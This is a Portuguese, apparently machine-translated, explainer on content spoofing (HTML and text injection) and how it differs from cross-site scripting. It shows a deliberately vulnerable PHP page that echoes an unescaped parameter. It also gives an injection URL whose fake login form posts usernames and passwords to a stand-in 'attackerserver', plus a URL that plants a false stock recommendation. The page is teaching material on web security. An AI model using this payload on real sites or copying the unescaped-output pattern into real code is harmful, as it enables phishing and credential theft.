Falsificação (Spoofing) de conteúdo

Descrição

Spoofing conteúdo, também conhecido como injeção de conteúdo ou desfiguração virtual, é um ataque visando um usuário tornada possível por uma vulnerabilidade de injeção em uma aplicação web. Quando um aplicativo não tratar adequadamente os dados do usuário fornecido, um atacante pode fornecer conteúdo a um aplicativo web, normalmente através de um valor de parâmetro, que é refletida de volta para o usuário. Este apresenta ao usuário uma página modificada no contexto do domínio confiável.
Este ataque é normalmente usado como ou em conjunto com a engenharia social, porque o ataque é explorar uma vulnerabilidade baseada em código e confiança do usuário.

Spoofing conteúdo vs Cross-site Scripting

Spoofing conteúdo é um ataque que está intimamente relacionado com Cross-site Scripting (XSS). Enquanto XSS usa <script> e outras técnicas para executar JavaScript, conteúdo spoofing usa outras técnicas para modificar a página, por motivos maliciosos.
Mesmo técnicas de mitigação de XSS são usados ​​dentro do aplicativo web, como a codificação de saída adequada, o aplicativo ainda pode ser vulnerável a ataques baseados em spoofing conteúdo do texto.


Exemplos

Hypertext Markup Language (HTML) Injeção
Um cenário possível ataque é demonstrado abaixo. Para este cenário, deixa assume nenhuma codificação de saída está sendo implementado:
1 - Atacante descobre vulnerabilidade de injeção e decide falsificar um formulário de login
2 - Atacante artesanato link malicioso, incluindo o seu conteúdo HTML injetada, e envia para o usuário por e-mail
3 - O usuário visita a página devido a página que está sendo localizado dentro de um domínio confiável
4 - HTML injetada O atacante é processado e apresentado ao usuário solicitando um nome de usuário e senha
5 - O usuário digita um nome de usuário e senha, que são ambos enviados para o servidor atacantes


A página PHP simples que contém uma vulnerabilidade de injeção através do parâmetro name:


<?php
    $name = $_REQUEST ['name'];
?>
<html>
	<h1>Welcome to the Internet!</h1>
	<br>
	<body>
            Hello, <?php echo $name; ?>!
	    <p>We are so glad you are here!</p>
	</body>
</html>

A funcionalidade da página pode ser testado fazendo a seguinte pedido GET para a página:

http://127.0.0.1/vulnerable.php?name=test

Ao solicitar o link abaixo, a página torna o HTML injetada, apresenta um formulário de login, e comenta o resto da página após o ponto de injeção. Quando um usuário digita seu nome de usuário e senha, os valores são enviados para uma página chamada login.php no servidor do atacante via POST.

http://127.0.0.1/vulnerable.php?name=<h3>Please Enter Your Username and Password to Proceed:</h3><form method="POST" 
action="http://attackerserver/login.php">Username: <input type="text" name="username" /><br />Password: <input type="password" 
name="password" /><br /><input type="submit" value="Login" /></form><!--

Injeção de texto ~
Outro exemplo de um ataque de spoofing conteúdo seria para apresentar informações falsas a um usuário via manipulação de texto. Um cenário de ataque é demonstrado abaixo. Para este cenário, vamos supor codificação de saída adequada foi implementado e XSS não é possível:
1 - Um atacante identifica uma aplicação web que dá recomendações aos seus usuários sobre se deve comprar ou vender uma determinada ação
2 - O atacante identifica um parâmetro vulnerável
3 - O artesanato atacante um link malicioso por modificar ligeiramente um pedido válido
4 - A ligação contendo o pedido modificado é enviado para um utilizador e que clica no link
5 - A webpage válido é criada usando os atacantes recomendação malicioso e que o usuário acredita que a recomendação foi a partir do site estoque


Página Válida ~
http://vulnerablesite/suggestions.php?stockid=123&stockrecommendation=We+Recommend+You+Buy+Now
Página Modificada ~
http://vulnerablesite/suggestions.php?stockid=123&stockrecommendation=We+Really+Recommend+You+Sell+This+Stock+Now



